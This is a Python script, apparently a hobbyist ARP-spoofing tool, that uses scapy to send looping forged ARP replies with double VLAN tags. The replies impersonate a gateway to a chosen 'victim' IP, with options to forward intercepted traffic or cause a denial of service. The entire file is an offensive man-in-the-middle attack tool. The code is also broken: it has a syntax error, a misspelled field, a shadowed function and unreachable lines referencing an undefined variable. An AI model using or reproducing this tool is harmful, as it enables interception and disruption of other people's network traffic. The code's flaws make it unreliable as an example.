import sys, scapy, time, os, socket
from scapy.all import *
from argparse import ArgumentParser
from os import geteuid
from uuid import getnode as get_mac
import threading

def enable_forwarding():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_forwarding():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


#pdst = packet destination
#psrc = packet source
#hwdst = hardware destination
#hwsrc = your mac automatically (which allos you to recieve the packets)
def arp(target_ip, gateway_ip, type):


	print('[-] Sending arp packets. CTRL+C to exit')
	
	t0 = threading.Thread(target = arp_target, args=(target_ip, gateway_ip, 0))
	t0.start()

	#if type != 1:
	#	t1 = threading.Thread(target = arp_target, args=(target_ip, gateway_ip, 1))
	#	t1.start()


def arp_target( target_ip, gateway_ip, targetIsGateway):

	target_pkt = ARP()
	target_pkt.op = 'is-at'

	print('target: '+target_ip+' gateway: '+gateway_ip)

	if targetIsGateway == 0:
		target_pkt.pdst = target_ip
		print(target_ip)
		target_pkt.psrc = gateway_ip)
		target_pkt.hwdst = get_mac(target_ip)
		send( Ether(dst=get_mac(target_ip))/Dot1Q(vlan=1)/Dot1Q(vlan=2)/target_pkt, inter=RandNum(10,40), loop=1 )

	else :
		print(get_mac(gateway_ip))
		target_pkt.psrc = target_ip
		target_pkt.hwdst = get_mac(gateway_ip)
		target_pkt.psdt = gateway_ip
		send( Ether(dst=get_mac(gateway_ip))/Dot1Q(vlan=1)/Dot1Q(vlan=2)/target_pkt, inter=RandNum(50,60), loop=1 )





#taken from blackhat
def get_mac(ip_address):
	response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
	  timeout=2, retry=10)
	for s, r in response:
	  return r[Ether].src
	return None
	print(mac[0:17])
	return mac[0:17]

#calls function arp_monitor_callback
if __name__ == "__main__":

	if not geteuid() == 0:
		exit("[-] Rerun with root access")
		
	#enable_forwarding()
	parser = ArgumentParser(description = '[-] BELIEVE YOU ARE THE GATEWAY')
	parser.add_argument('-T', required=False, dest ='type', help= '[0] Traffic Re-Routed to Source Ip. [1] DOS. Default [0]')
	parser.add_argument('-t', '--target_ip',  dest='target_ip', required=True, help= 'Set Victim Ip Address')
	parser.add_argument('-g', '--gateway_ip', dest='gateway_ip', required=True,help= 'Set ip you want to impersonate')
	parser.add_argument('-f', dest='forward', required = False, help = '[1] Enable packet forwarding. Defaut: unenabled')

	args = parser.parse_args()

	if args.forward ==1:
		enable_forwarding()
	arp(args.target_ip,args.gateway_ip,args.type)

		



